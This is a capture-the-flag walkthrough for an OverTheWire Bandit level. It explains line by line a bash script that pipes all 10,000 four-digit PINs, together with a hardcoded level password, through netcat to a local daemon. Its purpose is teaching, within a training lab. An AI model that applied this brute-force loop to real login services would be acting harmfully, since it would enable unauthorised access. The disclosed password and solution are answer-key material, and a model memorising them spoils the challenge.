# Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

## Brute-Forcing Script Explanation

This script attempts to brute-force a 4-digit PIN required to get the password for the next level in the Bandit challenge. 
Here's a step-by-step breakdown of the script and its syntax.

### Script Explanation

```bash
#!/bin/bash

# Retrieve the password for bandit24
PASS=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

# Open a connection to the daemon
{
    # Loop through all 4-digit PIN combinations
    for PIN in $(seq -f "%04g" 0 9999); do
        # Send the password and PIN
        echo "$PASS $PIN"
        sleep 1  # Optional: Add a delay between attempts to avoid overwhelming the server
    done
} | nc localhost 30002
```

#### Detailed Breakdown

1. **`#!/bin/bash`**  
   This line specifies that the script should be run using the Bash shell.

2. **`PASS=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`**  
   - `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8` is the password of the current level which is required as per the question.
   - This assigns the content (password) of the file to the variable `PASS`.

3. **`{ ... }` Block**  
   - The curly braces `{ ... }` create a code block to group multiple commands together, allowing us to pipe the combined output to the `nc` command.
   
4. **`for PIN in $(seq -f "%04g" 0 9999); do`**  
   - `for PIN in ...` starts a loop that will go through each possible 4-digit PIN from 0000 to 9999.
   - `seq -f "%04g" 0 9999` generates all 4-digit numbers from 0000 to 9999. The `-f "%04g"` option ensures each number has exactly 4 digits (e.g., 0001, 0023).
   - `for PIN in ... ; do ... done`: This is a loop that goes through each PIN from 0000 to 9999.
seq -f "%04g" 0 9999: This command generates a sequence of numbers from 0000 to 9999. The `-f "%04g"` part makes sure each number is 4 digits long, padding with zeros when necessary (e.g., 0001, 0050).

5. **`echo "$PASS $PIN"`**  
   - `echo` prints the password and current PIN combination, separated by a space, which is the required format mentioned in the question.
   - This output will be sent to the `nc` command, which is connected to the server on port 30002.

6. **`sleep 1` (Optional)**  
   - `sleep 1` pauses the script for one second between each PIN attempt to avoid overwhelming the server.

7. **`| nc localhost 30002`**  
   - `|` is the pipe operator, sending the output of the block to the `nc` (Netcat) command.
   - `nc localhost 30002` establishes a connection to the server running on `localhost` at port `30002`, which is waiting for the password and PIN.
   
#### Summary

This script brute-forces the 4-digit PIN by attempting each possible PIN in sequence. It sends each combination of the password and PIN to the server until it finds the correct PIN, at which point the server will return the next level's password.
